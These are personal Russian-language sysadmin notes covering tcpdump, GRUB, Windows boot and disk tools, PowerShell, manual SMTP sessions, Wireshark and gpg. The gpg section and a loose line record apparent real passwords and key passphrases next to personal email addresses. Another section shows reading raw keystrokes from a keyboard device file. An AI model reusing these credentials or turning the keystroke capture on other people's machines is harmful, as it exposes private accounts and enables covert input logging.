-I - переключить интерфейс в режим монитора для захвата всех проходящих пакетов;
-j - установить формат Timestamp для записи пакетов;
-J - посмотреть доступные Timestamp;
-K - не проверять контрольные суммы пакетов;
-l - добавить поддержку прокрутки к выводу;
-L - вывести поддерживаемые протоколы подключения для интерфейса;
-n - не отображать доменные имена;
-r - прочитать пакеты из файла, созданного с помощью -w;
-v, -vv, -vvv - более подробный вывод;
-q - выводить минимум информации;
-w - записать вывод в файл;
-Z - пользователь, от имени которого будут создаваться файлы.
Это не все опции, но их вам будет вполне достаточно для решения большинства задач. Чаще мы будем применять фильтры. С помощью фильтров вы можете отсеивать только те типы пакетов, которые хотите видеть. Вы можете фильтровать по ip адресу, протоколу, сети, интерфейсу и многим другим параметрам. Но фильтры tcpdump мы будем рассматривать уже на примерах.

Я: tcpdump -i enp0s3 -v  - запускается как служба? и остается после ctrl-z ?????
sudo tcpdump -i enp0s3 -v  src 10.250.0.100 // прослушивать пакеты с опредленного узла (src) 
18:03:27.633759 ARP, Ethernet (len 6), IPv4 (len 4), Reply pc_ivanov.main.onliner.by is-at b0:6e:bf:31:c8:15 (oui Unknown), length 46
18:03:33.053705 IP (tos 0x0, ttl 128, id 45242, offset 0, flags [none], proto UDP (17), length 107)
    pc_ivanov.main.onliner.by.57613 > lnxmnt.main.beltelecom.by.snmp:  { SNMPv1 { GetRequest(64) R=81174  25.3.2.1.5.1 25.3.5.1.1.1 25.3.5.1.2.1 } }
18:03:33.053706 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has HP4015.main.beltelecom.by tell pc_ivanov.main.onliner.by, length 46
18:03:34.005039 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has HP4015.main.beltelecom.by tell pc_ivanov.main.onliner.by, length 46
...
Также мы можем отобрать пакеты, отправляемые на определенный узел:
 sudo tcpdump -i eth0 dst host google-public-dns-a.google.com
Как видите, это DNS пакеты и здесь вместо флагов TCP содержится полезная информация, запрос ip адреса хоста. Также вы можете выбрать ответные пакеты от определенного хоста:
 sudo tcpdump -i eth0 src host google-public-dns-a.google.com
Точно такое же можно провернуть для http (порт 80):
 sudo tcpdump -vv -i eth0 port 80
Естественно, тут тоже можно применять dst и src для более конкретных результатов. Вы можете фильтровать не один порт, а целый диапазон портов:
 sudo tcpdump portrange 21-23
Если указать один из протоколов, вы отфильтруете только пакеты этого протокола, например tcp, udp или arp:
 sudo tcpdump -vv arp
Иногда бывает необходимо сохранить захваченный трафик в файл, для этого используется опция -w:
 sudo tcpdump -i eth0 -w file.pcap
Остался еще один момент, на который стоит обратить внимание. Это формат отображения содержимого пакетов. Вы можете вывести содержимое пакета в формате ASCII используйте опцию -A:
 sudo tcpdump -A -i eth0
Также вы можете отобразить содержимое в формате HEX и ASCII для этого используйте -XX:
 sudo tcpdump -XX -i eth0

sudo tcpdump 'udp port 53' -vn //отображать обмен к DNS серверам (по 53 порту)
    192.168.100.9.50464 > 8.8.8.8.53: 57068+ A? byfly.by. (26)
16:20:55.321564 IP (tos 0x0, ttl 56, id 39321, offset 0, flags [none], proto UDP (17), length 70)
    8.8.8.8.53 > 192.168.100.9.50464: 57068 1/0/0 byfly.by. A 86.57.251.89 (42)
16:20:55.322010 IP (tos 0x0, ttl 64, id 46913, offset 0, flags [none], proto UDP (17), length 54)
    192.168.100.9.52033 > 8.8.8.8.53: 6244+ AAAA? byfly.by. (26)
16:20:55.382656 IP (tos 0x0, ttl 120, id 36347, offset 0, flags [none], proto UDP (17), length 82)
    8.8.8.8.53 > 192.168.100.9.52033: 6244 1/0/0 byfly.by. AAAA 2a02:2208:1:1::89 (54) 

= END of tcpdump  =


 

 
Ермакович Команды по исправлению/блокированию перехода ОС в режим энергопотребления
cat /etc/default/grub | grep DEF

GRUB_CMDLINE_LINUX_DEFAULT="intel_idle.max_cstate=1"
update-grub
GRUB_CMDLINE_LINUX_DEFAULT="intel_idle.max_cstate=1"
https://askubuntu.com/questions/749349/how-to-set-intel-idle-max-cstate-1
https://d1mon.com/n/1676


14.06.2023 МЦК СКСУ Ермакович, после подключения RAID1 - sdc
[aeon@IQMM1 mnt]$ df -h
Filesystem            Size  Used Avail Use% Mounted on

/dev/mapper/vg_iqmm1-lv_root

                       50G   26G   21G  56% /
tmpfs                  32G     0   32G   0% /dev/shm
/dev/sda2             477M   52M  401M  12% /boot
/dev/sda1             200M  264K  200M   1% /boot/efi
/dev/mapper/vg_iqmm1-lv_home
                     1020G  920G   48G  96% /home
/dev/sdb1             1.8T  1.4T  304G  82% /mnt/disk01
/dev/sdc              8.4T   44M  7.9T   1% /mnt/iscsi
  

grep find + подстановки
Нить - процесс, работающий в рамках модели общего разделяемой памяти




 Возможные осложнения //Самоучитель системного администратора Linux ( PDFDrive ).pdf стр 221
У вас могут возникнуть сложности, как при установке драйвера, так и при настройке самого беспроводного интерфейса. Сначала рассмотрим набор команд, кото-
рые могут помочь настроить драйвер: 
 uname –a — получить версию ядра. При установке настоящих Linux-драйверов 
(а не Windows-драйверов через ndiswrapper) нужно, чтобы модуль (так в Linux называются драйверы)
 был откомпилирован для соответствующей версии ядра;
 lspci, lsusb, lshw — помогают идентифицировать ваше устройство и выводят, 
соответственно, список PCI-устройств, список USB-устройств и список обору-
дования компьютера; 

lsmod — выводит список загруженных модулей (драйверов устройств). 

Если у вас не получается установить драйвер имеющегося у вас устройства, 
можно попытаться приобрести и установить другой USB-адаптер, но перед покупкой убедитесь, что сможете его настроить. 
Для настройки сетевого интерфейса пригодятся следующие команды: 
 iwconfig — просмотреть информацию обо всех беспроводных интерфейсах; 
 iwlist scan — найти беспроводные сети; 
 sudo dhclient wlan0 — обновить IP-адрес и другие сетевые параметры интерфейса wlan0 (имя может быть другим), предварительно получив их от DHCP-
сервера;
 route — просмотр таблицы маршрутизации;
 sudo /etc/init.d/networking restart — перезапуск сети; 
 dmesg | less — просмотреть сообщения ядра; 
 sudo killall NetworkManager — остановить NetworkManager;
 iwevent — просмотреть события беспроводной сети; 
 sudo /etc/init.d/dbus restart — перезапустить все сетевые демоны.

lshw // список устройств PC и из ресурсов/файлов в ОС Linux 
  // чтобы найти какому файлу соответствует устройство - искать ппо ключевыому слову
lnxpc
    описание: Project-Id-Version: lshwReport-Msgid-Bugs-To: FULL NAME <EMAIL@ADDRESS>PO-Revision-Date: 2015-01-21 09:55+0000Last-Translator: Aleksey Kabanov <Unknown>Language-Team: Russian <ru@li.org>MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bitX-Launchpad-Export-Date: 2023-02-09 12:36+0000X-Generator: Launchpad (build 77239e4aa149cc645d32cd0d9466bc0d9f82abaa)Language: ru_RU
    продукт: VirtualBox
    производитель: innotek GmbH
    версия: 1.2
    серийный №: 0
    разрядность: 64 bits
    возможности: smbios-2.5 dmi-2.5 smp vsyscall32
    конфигурация: family=Virtual Machine uuid=f1217655-1376-472d-a4ac-af5a303b97fa
  *-core
       описание: Материнская плата
       продукт: VirtualBox
       производитель: Oracle Corporation
       физический ID: 0
       версия: 1.2
       серийный №: 0
     *-firmware
  *-input:2
       продукт: AT Translated Set 2 keyboard
       физический ID: 3
       логическое имя: input2
       логическое имя: /dev/input/event2  // файл клавиатуры
       логическое имя: input2::capslock
       логическое имя: input2::numlock
       логическое имя: input2::scrolllock
       возможности: i8042

sudo hexdump /dev/input/event2 // прочитать дамп данных от клавиатуры (cм в lshw "event2")
   // через ssh может не рабоаттьь корректно! только через bash GUI mint

sudo xxd /dev/input/event2  //прочитать дамп данных от клавиатуры,  ввод данных делать на другом терминале

xxd  -  создаёт  представление  файла  в виде шестнадцатеричных кодов или выполняет
       обратное преобразование.
echo hello |xxd
00000000: 6865 6c6c 6f0a                           hello.
xxd lshw_result.txt //cm man xxd

https://losst.pro/protsess-zagruzki-linux Процесс загрузки Linux


Кетов Видео web3 (40 мин) папки, заканчивающиеся на '.d' (например /run/NetworkManager/conf.d) папки с 
   конфигурациями и др файлами, поступающими от дистрибутива программ,
   инф. в них пользователи не меняют. Меняется инф-ция КАК правило в папках с такими названиями? но без !d! ( ./conf)



===================== Windows 10 Disk ==================
Windows 10 Disk Managment https://lumpics.ru/how-open-disk-management-in-windows-10
Способ 1-2:запуск win+r (или через cmd)-> diskmgmt.msc  просмотр всех разделов на SDD C D и служебных 0 для резервного копирования
см столбец Status:  Disk0 Partition 1:  "EFI system partition" 200M
Способ 3: «Этот компьютер»
Если ярлык «Этот компьютер» у вас помещен на рабочий стол, для запуска «Управления дисками» достаточно будет воспользоваться
его контекстным меню (правый клик по значку) и выбрать там пункт «Управление».
Эти действия откроют оснастку «Управление компьютером», частью которого и является интересующее 
нас средство – просто выберите его на боковой панели.
ИлИ  в режиме администрировани (аккуратно работать!) 
https://translated.turbopages.org/proxy_u/en-ru.ru.a147c855-64578975-8c93d91b-74722d776562/https/superuser.com/questions/1399789/how-do-i-find-out-which-efi-system-partition-is-in-use-by-windows-10
запустить DISKPART, затем запрос "LIST VOLUME"
DISKPART>  LIST VOLUME
  Volume ###  Ltr  Label        Fs     Type        Size     Status     Info
  ----------  ---  -----------  -----  ----------  -------  ---------  --------
  Volume 0     C   Windows      NTFS   Partition    120 GB  Healthy    Boot
  Volume 1     D   Data         NTFS   Partition    341 GB  Healthy
  Volume 2         SYSTEM       FAT32  Partition    200 MB  Healthy    System
  Volume 3         WINPE        FAT32  Partition    512 MB  Healthy    Hidden
  Volume 4         Onekey       NTFS   Partition     14 GB  Healthy    Hidden
  Volume 5         WinRE        NTFS   Partition   1024 MB  Healthy    Hidden

  Volume 2 - очевидно EFI раздел

pass excel 123456789OMSK


 = = = Windows 10 проверка производительности = = = 
https://learn.microsoft.com/ru-ru/windows-server/administration/windows-commands/perfmon
Запустите Надежность Windows и Монитор производительности в определенном автономном режиме.
perfmon </res|report|rel|sys>
Параметр	Описание
/Res	Запускает представление ресурсов.
/Отчет	Запускает набор сборщиков данных диагностики системы и отображает отчет о результатах.
/Rel	Запускает монитор надежности.
/Sys	Запускает Монитор производительности.


  = = = = = =  WIndows10  Загрузчик Windows (Windows Boot Manager, BOOTMGR) = = = = = =

Загрузчик windows10: bootmgr загрузчик win10 или на efi разделе или в корне основн разд win 
https://remontka.pro/windows-10-bootloader-fix/
https://winitpro.ru/index.php/2017/06/16/ruchnoe-peresozdanie-fajla-konfiguraciya-zagruzki-bcd-v-windows-10/
https://habr.com/ru/articles/301334/ 

1. Достаем код Bootmgr из системы
Загрузчик Bootmgr появился в операционных системах семейства Windows начиная с Windows Vista. Причиной
его разработки послужило то, что старый добрый ntldr, использовавшийся в линейке NT не мог загружать систему,
на компьютерах с материнскими платами оснащенными UEFI, в те времена (2005 год) мало распространенными среди
широкого круга рядовых пользователей.
По умолчанию, при штатной установке, этот загрузчик помещается в !отдельный раздел!, расположенный в начале HDD,
с размером, достаточным для размещения самого bootmgr а так же файлов его конфигурации. Данный раздел не монтируется
в обычном режиме работы системы и буква диска ему не присваивается. В системах с MBR создания этого раздела можно избежать,
устанавливая Windows на предварительно размеченный и отформатированный HDD.
В этом случае загрузчик помещается в тот же раздел, что и файлы ОС.
Системы с EFI + GPT изначально требуют наличия такого раздела, имеющего тип 0xef и отформатированного в FAT.

Я: на vichonor\victor раздел EFI скроее всего монтируется  (или кописруется ) в папку C:\Windows\Boot\EFI, 
файлы bootmgr.efi и др и в папке C:\Windows\Boot\DVD\EFI  файл конфигурации BCD

см https://www.bootdev.ru/2015/10/windows-bootloader.html?ysclid=ll9m4vh5up250508184
Windows Boot Manager - загрузчик операционных систем Windows Vista/7/8/10. Естественно поддерживается EFI режим загрузки. И конечно же его можно использовать не только для загрузки Windows.
Для примера скриншот меню одной мультизагрузочной сборки, где в качетсве загрузчика использовался Windows Boot Manger.
Нет поддержки загрузки образов дисков, таких как ISO, IMG и т.д., но данный вопрос решается с помощью загрузчика Grub4Dos, который используется в качестве посредника.
Сам загрузчик состоит из записи MBR (используется только в режиме загрузки BIOS), исполняемого файла загрузчика bootmgr или bootmgfw.efi для EFI, и файла конфигурации BCD (Boot Configuration Data).
Скачать файлы bootmgr и bootmgr.efi, можно из самой операционной системы, по путям C:\Windows\Boot\PCAT\bootmgr и C:\Windows\Boot\EFI\bootmgfw.efi. Записать MBR на нужный диск можно будет в командной строке Windows, с помощью команды bootsect, или с помощью программы BOOTICE.
Создать и редактировать файл конфигурации BCD, можно либо через командную строку (команда bcdedit), либо более удобно, с помощью программы EasyBCD или BOOTICE.
!!! Спасибо, братан! Я охотился за майнерами и вирусами на своём компе и случайно удалил bootmgr (удалял из под linux).
Прочитал эту статью, достал фаил из C:\Windows\Boot\PCAT\bootmgr, вставил в корень диска C и всё заработало... Спасибо!

Windows WORKGROUP vs Active Directory
Workgroup environment: This environment is usually found in small offices and home offices.
Active Directory environment: Larger offices (usually with more than 15 unique users) use Active Directory.
https://www.windows-active-directory.com/what-is-a-workgroup-and-how-is-it-set-up.html

  = = = = = =  WIndows10 powershell = = = = = =

C:\Users\victo>whoami
vichonor\victo

C:\Users\victo>net user
User accounts for \\VICHONOR
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
victo                    WDAGUtilityAccount
The command completed successfully.

C:\Users\victo>Echo %UserName%
victo
win+r -> msinfo32

вызвать диспетчер задач. Это можно сделать, нажав на клавиши Ctrl+Shift+Esc.
Откройте вкладку «Пользователи», где указано имя текущего пользователя компьютера.

powershell comandlet
https://info-comp.ru/sisadminst/555-directory-windows-powershell-cmdlets.html?ysclid=lkhbdlut28343268740
https://skillbox.ru/media/code/powershell-dlya-chaynikov-chto-eto-i-kak-s-nim-rabotat/?ysclid=lkhaqjbva0988468229#stk-1
https://skillbox.ru/media/code/regulyarnye-vyrazheniya-v-python-sintaksis-poleznye-funktsii-i-zadachi/
https://bookflow.ru/shpargalka-po-powershell-komandy-operatory-i-mnogoe-drugoe/?ysclid=lkhbjjrfer597340388
https://bookflow.ru/42-komandy-linux-kotorye-vy-dolzhny-znat/
https://learn.microsoft.com/ru-ru/powershell/module/microsoft.powershell.management/stop-computer?view=powershell-7.3
переменные среды
https://learn.microsoft.com/ru-ru/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.3

PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Set-Content  d:\123.txt -Value 'Hello, World'
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Get-Content d:\123.txt
Hello, World
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Set-Content  d:\123.txt -Value '2Hello, World2'
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Get-Content d:\123.txt
2Hello, World2
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Add-Content d:\123.txt -Value (Get-Date)
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> Get-Content d:\123.txt // cat - аналог Get-Content
2Hello, World2
25.07.2023 13:47:23

(Get-Date).AddDays(-1)
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> (Get-Date).AddDays(-1)

24 июля 2023 г. 18:11:04

$fl = (Get-Content d:\123.txt)
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> echo $fl
2Hello, World2
25.07.2023 13:47:23
привет

$c = ls
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> echo $c
Каталог: C:\WINDOWS\syswow64\WindowsPowerShell\v1.0
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        03.11.2020     18:20                en
-a----        07.12.2019     12:10          10112 Event.Format.ps1xml
-a----        07.12.2019     12:10          25306 FileSystem.format.ps1xml

 $prc=ps
PS C:\WINDOWS\syswow64\WindowsPowerShell\v1.0> echo $prc

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    243      17     4492      16604       3,08   7968   2 AkelPad
    481      29    21144      28572       0,39   3632   2 ApplicationFrameHost
    126       8     1580       5224              3536   0 armsvc
   5128     265   270228      52580              3544   0 avp
    466      28    45332      14228              3920   0 avpsus

type или cat C:\Users\victo\Downloads\file.txt # печать содержимого на экран аналог cat

Переменные среды
echo $env:USERPROFILE
C:\Users\victo

echo $env:USERDOMAIN # echo не обязательно
VICHONOR

echo $Env:windir
C:\WINDOWS
$env:HOMEDRIVE
C:
$env:path
C:\Program Files\Pervasive Software\PSQL\bin\;C:\Program Files (x86)\Pervasive Software\PSQL\bin\;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\UES_Manyk\AppData\Local\Microsoft\WindowsApps;
$env:SystemRoot
C:\WINDOWS

C:\ Get-Help Invoke-WebRequest
Invoke-WebRequest - имеет алиасы curl wget - аналог команд в linux
 192.168.100.12

arp-cache search ldap | grep ldap | grep krb

 = доступ SMTP POP IMAP серверам через CLI = 
https://www.youtube.com/watch?v=dKZ35haWChM
SMTP работает в текстовом режиме, putty
Подключаемся к почтовому серверу клиентом терминалов на порт 25 и отправляем письмо с помощью команд SMTP:
- EHLO - приветствие в расширенной версии протокола SMTP.
- MAIL FROM - адрес отправителя.
- RCPT TO - адрес получателя.
- DATA - ввод письма.
- QUIT - выход.

Письмо состоит из двух частей: заголовок и тело. В примере рассматриваются заголовки:
- From - Адрес и имя отправителя
- Subject - Тема письма.
Тело письма должно быть отделено от заголовков пустой строкой !!!!
Письмо должно заканчиваться строкой с одной точкой.!!!!
У меня получилось только smtp-mail.outlook.com, 
220 FR0P281CA0096.outlook.office365.com Microsoft ESMTP MAIL Service ready at Sun, 24 Dec 2023 10:06:01 +0000
EHLO
250-FR0P281CA0096.outlook.office365.com Hello [37.214.34.176]
250-SIZE 157286400
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-STARTTLS
250-8BITMIME
250-BINARYMIME
250-CHUNKING
250 SMTPUTF8
MAIL FROM: victornm2022@outlook.com
451 5.7.3 STARTTLS is required to send mail [FR0P281CA0096.DEUP281.PROD.OUTLOOK.COM 2023-12-24T10:09:42.696Z 08DC040EDB9CFDFC]
выдал ошибку тк не не исользуется шифрование STARTTLS
также и smtp.gmail.com, необходим TLS
220 smtp.gmail.com ESMTP c5-20020a05600c0a4500b0040c411da99csm21335711wmq.48 - gsmtp
EHLO gmail.com
...
MAIL FROM: victornm1975@gmail.com
530-5.7.0 Must issue a STARTTLS command first.
 = end доступ SMTP .. CLI = 





 = = wireshark = =
https://www.asozykin.ru/
"C:\Program Files\Google\Chrome\Application\chrome.exe" --ssl-version-max=tls1.3 --ssl-key-log-file=D:\Books\kkk.log

А.Созыкин Анализ Ethernet Wi-fi HTTP NDP DNS SNMP ICMP FTP IMAP POP3 IPv6 и дв wireshark 
https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oiKPQ9GXOvntj44Eu8IGAJK 
Анализ TLS wireshark  - при фильтре "tls" также отражаются пакеты QUIC (при обращении к сервисам Google), 
    которые такж втутри себя содержат tls-сообщения!!
https://www.youtube.com/watch?v=bYR0XacszUk&t=1s
https://www.youtube.com/watch?v=efzQEAm7-Jc
https://www.youtube.com/watch?v=VIFJFHWlxzo 
Фильтр Захват wireshark  между 2мя узлами: "host IP1 and host IP2"
wireshark в linux запускать от sudo иначе enps0 не видит
wireshark шаблон фильтра "dns && ip.addr==192.168.100.9 "

 =!= windows 10 программа настройки сисистемы "Control Panel"
c:\Windows\System32\control.exe
Вызов 1) через терминал или через "Windows+R" набрать control.exe 2)через поиск/search лупу

= = Windows 10 точки восстановления backup резервирования системы точки отката= =
https://www.bing.com/search?q=%d1%82%d0%be%d1%87%d0%ba%d0%b8+%d0%b2%d0%be%d1%81%d1%81%d1%82%d0%b0%d0%bd%d0%be%d0%b2%d0%bb%d0%b5%d0%bd%d0%b8%d1%8f+%d1%81%d0%b8%d1%81%d1%82%d0%b5%d0%bc%d1%8b&form=WNSGPH&qs=OS&cvid=4e43590f31c2459c89d43a6c3be45703&pq=%D1%82%D0%BE%D1%87%D0%BA%D0%B0&cc=BY&setlang=en-US&PC=NMTS&nclid=6FEBE9675148C1BEEE1EBC3A1E8DBE83&ts=1701272858487&wsso=Moderate
settings->about->system protection

https://hetmanrecovery.com/ru/recovery_news/system-restore-point-windows10.htm
Откройте "Control Panel" и перейдите в раздел Восстановление / Настройка восстановления системы.

= mutt =
https://developers.google.com/identity/protocols/oauth2?hl=ru  Использование OAuth 2.0 Google
https://www.dmosk.ru/miniinstruktions.php?mini=mutt&ysclid=lpmx8j81rl674741824#pop3
неудачная настройка почты в яндех (в настройках яндех-почты  необходимо разрешить INAP)
долго  до этого не мог настроить в минт тандерберд
http://www.mutt.org/doc/manual/#imap - написано, что mutt необходим скрипты 
/usr/share/doc/mutt/examples/mutt_oauth2.py и mutt_oauth2.py.README, но ни на google ни microsoft не получилось 
   зарегистровать токет OAuth 2.0 


sha256sum -c SHA256SUMS # проверка файла контр суммы

= = gpg шифрование и цифровая подпись = =
https://www.gpg4win.org/ - для Windows, в т.ч. outlook
https://habr.com/ru/articles/358182/  https://habr.com/ru/articles/659755/
https://www.gnu.org/server/standards/translations/ru/gnupg/manual/2.1/gnupg_html/Nastroiki-GPG.html
пароли для ключей :  Mint  VictorM <victorm@lnx.org> 5791_victorm_gpg
  Android VictorManiuk <victornm1975@gmail.com> - не задавался
пароль для связки ключей VictorM и VictorManiuk qaz555 
Публичные ключи VictorManiuk и F-Droid импортированы из приложания на Smartphone Xaomi Openkeychain
 (через файл backup_2023-11-30.pub.pgp) с сервера keyserver.ubuntu.com 
 все делалось на вирт машине LnxPC1
# load the public key
gpg --keyserver keyserver.ubuntu.com --recv-key 37D2C98789D8311948394E3E41E7044E1DBA2E89
# verify the file
gpg --verify F-Droid.apk.asc F-Droid.apk

# не получилось через сервер загрузить доп ключ,сгенерированный на androide, т.к?. "no user ID"
gpg --keyserver keys.openpgp.org --recv-key 678b9c4f4e01c236d72f245776c9c0e2a05ebdb6
gpg: key 76C9C0E2A05EBDB6: new key but contains no user ID - skipped
gpg: Всего обработано: 1
gpg:           без идентификатора пользователя: 1


gpg -k # список всех ключей, в т.ч. импортированных
/home/oem/.gnupg/pubring.kbx
----------------------------
pub   rsa3072 2023-11-30 [SC] [годен до: 2024-02-28]
      3F9C861C339A98C8EF991B7EED9F0C92F28462CB
uid         [  абсолютно ] VictorM <victorm@lnx.org>
sub   rsa3072 2023-11-30 [E] [годен до: 2024-02-28]

pub   rsa4096 2014-04-25 [C]
      37D2C98789D8311948394E3E41E7044E1DBA2E89
uid         [ неизвестно ] F-Droid <admin@f-droid.org>
sub   rsa3072 2014-04-25 [E] [годен до: 2026-04-25]
sub   rsa3072 2014-04-25 [S] [годен до: 2026-04-25]

pub   rsa3072 2023-11-30 [SC]
      78EE3F8670154F5BD61CDFFCB4B6748F640C5E02
uid         [ неизвестно ] VictorManiuk <victornm1975@gmail.com>
sub   rsa3072 2023-11-30 [E]

gpg --import backup_2023-11-30.pub.pgp  # импорт ключа из файла
gpg: ключ B4B6748F640C5E02: импортирован открытый ключ "VictorManiuk <victornm1975@gmail.com>"
gpg: Всего обработано: 1
gpg:               импортировано: 1

Отправить публичный ключ на сервер:
gpg --keyserver <URL> --send-keys <KeyID>
Получить публичный ключ с идентификатором ключа с сервера :
gpg --keyserver <URL> --recv-keys <KeyID>
Получить обновления ключей с сервера:
gpg --keyserver <URL> --refresh-keys

gpg -se -r victornm1975@gmail.com file.txt#Зашифровать файл!ДЛЯ!пользователя victornm1975, 
  т.е. его откр ключем , требуется ввод пароля в GUI

gpg -u 0x12345678 -s message.txt
Подписать файл message ключом 0x12345678 и сохранить подпись в файл sign.asc.

gpg  -d  sign.txt >> sign #расшифровать сообщение  только подписанное ЭЦП VictorManiuk
gpg: Подпись сделана Пт 01 дек 2023 13:41:44 +03
gpg:                ключом RSA с идентификатором B4B6748F640C5E02
gpg:                издатель "victornm1975@gmail.com"
gpg: Действительная подпись пользователя "VictorManiuk <victornm1975@gmail.com>" [неизвестно]
Отпечаток первичного ключа: 78EE 3F86 7015 4F5B D61C  DFFC B4B6 748F 640C 5E02
oem@LnxPC1:~$ cat sign
Привет
Пока

gpg  -d  cipr.txt >> uncipr #расшифровать сообщение зашифрованное для VictorM и подписанное ЭЦП VictorManiuk
gpg: зашифровано 3072-битным ключом RSA с идентификатором C4DBCC6E8BEF7394, созданным 2023-11-30
      "VictorManiuk <victornm1975@gmail.com>"
gpg: зашифровано 3072-битным ключом RSA с идентификатором 3BE9EEF2326F4D71, созданным 2023-11-30
      "VictorM <victorm@lnx.org>"
gpg: Подпись сделана Пт 01 дек 2023 13:44:19 +03
gpg:                ключом RSA с идентификатором B4B6748F640C5E02
gpg:                издатель "victornm1975@gmail.com"

https://itsecforu.ru/2019/06/06/%F0%9F%A4%A8-%D0%BA%D0%B0%D0%BA-%D0%BF%D1%80%D0%BE%D0%B2%D0%B5%D1%80%D0%B8%D1%82%D1%8C-%D0%BF%D0%BE%D0%B4%D0%BB%D0%B8%D0%BD%D0%BD%D0%BE%D1%81%D1%82%D1%8C-%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC/?ysclid=lq5mb9oqt3703871785
Проверьте подпись с помощью:
gpg --verify SHA256SUMS.sign SHA256SUMS
Вы получите:
gpg: Signature made Sun 17 Feb 2019 05:10:29 PM EET
gpg: using RSA key DF9B9C49EAA9298432589D76DA87E80D6294BE9B
gpg: Can't check signature: No public key
Это означает, что у вас нет открытого ключа на вашем компьютере, что является нормальным.
Вы должны импортировать его с сервера ключей.
gpg --keyserver keyring.debian.org --recv-keys DF9B9C49EAA9298432589D76DA87E80D6294BE9B
Если сервер ключей не работает, вы можете использовать альтернативный. (keyring.debian.org на keyserver.ubuntu.com)
...
= = end gpg = =





$ echo $(tty)
/dev/pts/0

 = = make = =
https://rus-linux.net/nlib.php?name=/MyLDP/algol/gnu_make/gnu_make_3-79_russian_manual.html#SEC25
https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html !! 
https://www.gnu.org/software/make/manual/html_node/Wildcard-Examples.html !!

http://www.opennet.ru/docs/RUS/gnumake/#Make
Утилита make это традиционное средство, применяемое для сборки программных проектов. 
Она является универсальной программой для решения широкого круга задач, где одни файлы
  должны автоматически обновляться при изменении других файлов.
При запуске программа make читает файл с описанием проекта (makefile) и, интерпретируя 
  его содержимое, предпринимает необходимые действия. Файл с описанием проекта представляет
  собой текстовой файл, где описаны отношения между файлами проекта, и действия, которые 
  необходимо выполнить для его сборки.
3.1 Правила
Основным "строительным элементом" make-файла являются правила (rules). В общем виде правило выглядит так:

    <цель_1> <цель_2> ... <цель_n>: <зависимость_1> <зависимость_2> ... <зависимость_n> 
        <команда_1>
        <команда_2>
        ...
        <команда_n> 
Цель (target) - это некий желаемый результат, способ достижения которого описан в правиле. 
А)  Цель может представлять собой !имя файла!. В этом случае правило описывает, какможно
  получить новую версию этого файла.Например:
    iEdit: main.o Editor.o TextLine.o 
        gcc  main.o Editor.o TextLine.o -o iEdit
  целью является файл iEdit (исполняемый файл программы). Правило описывает Получить новую 
  версию файла iEdit (скомпоновать из перечисленных объектных файлов).
B) Цель может быть именем действия.Например действие clean (очистка).рода цели называются 
    псевдоцели (pseudotargets) или абстрактные цели (phony targets).
    clean: 
        rm *.o iEdit
....
3.2. Алгоритм работы make ЧИТАЙ ЭТО ДАЛЕЕ на САЙТЕ!АЛГОРИТМ make
также читай об " автоматических переменных" $@ $? $< и т.д.
  https://rus-linux.net/nlib.php?name=/MyLDP/algol/gnu_make/gnu_make_3-79_russian_manual.html#SEC101

!! make -p // вывод настроек make, правил по умолчанию и переменных окружения

 https://habr.com/ru/articles/211751/  !! https://www.gnu.org/software/make/manual/html_node/index.html
make — утилита предназначенная для автоматизации преобразования файлов из одной формы в другую.
 Правила преобразования задаются в скрипте с именем Makefile, который должен находиться в корне 
 рабочей директории проекта. Сам скрипт состоит из набора правил, которые в свою очередь
 описываются:
1) целями (то, что данное правило делает);
2) реквизитами (то, что необходимо для выполнения правила и получения целей);
3) командами (выполняющими данные преобразования). 
!!!строки, содержащие команды обязательно должны начинаться с символа табуляции!!!!

В общем виде синтаксис makefile можно представить так:
То есть, правило make это ответы на три вопроса:
{Из чего делаем? (реквизиты)} ---> [Как делаем? (команды)] ---> {Что делаем? (цели)}
Несложно заметить что процессы трансляции и компиляции очень красиво ложатся на эту схему:
{исходные файлы} ---> [трансляция] ---> {объектные файлы}
{объектные файлы} ---> [линковка] ---> {исполнимые файлы}
пример makefile
hello: main.c
	gcc -o hello main.c
Данный Makefile состоит из одного правила, которое в свою очередь состоит из цели — «hello»,
 реквизита — «main.c», и команды — «gcc -o hello main.c». 
 Теперь, для компиляции достаточно дать команду make в рабочем каталоге. 
 По умолчанию make станет выполнять самое первое правило, если цель выполнения 
   не была явно указана при вызове:
	$ make <цель>
краткий список стандартных (псевдо)целей:
all — является стандартной целью по умолчанию. При вызове make ее можно явно не указывать.
clean — очистить каталог от всех файлов полученных в результате компиляции.
install — произвести инсталляцию
uninstall — и деинсталляцию соответственно.
Для того чтобы make не искал файлы с такими именами псевдоцелей, их следует определить в 
 Makefile, при помощи директивы .PHONY .
  Далее показан пример Makefile с целями all, clean, install и uninstall:

.PHONY: all clean install uninstall
all: hello
clean:
	rm -rf hello *.o
main.o: main.c
	gcc -c -o main.o main.c
hello.o: hello.c
	gcc -c -o hello.o hello.c
hello: main.o hello.o
	gcc -o hello main.o hello.o
install:
	install ./hello /usr/local/bin
uninstall:
	rm -rf /usr/local/bin/hello

Теперь мы можем собрать нашу программу, произвести ее инсталлцию/деинсталляцию,
  а так же очистить рабочий каталог, используя для этого стандартные make цели.
Обратите внимание на то, что в цели all не указаны команды; 
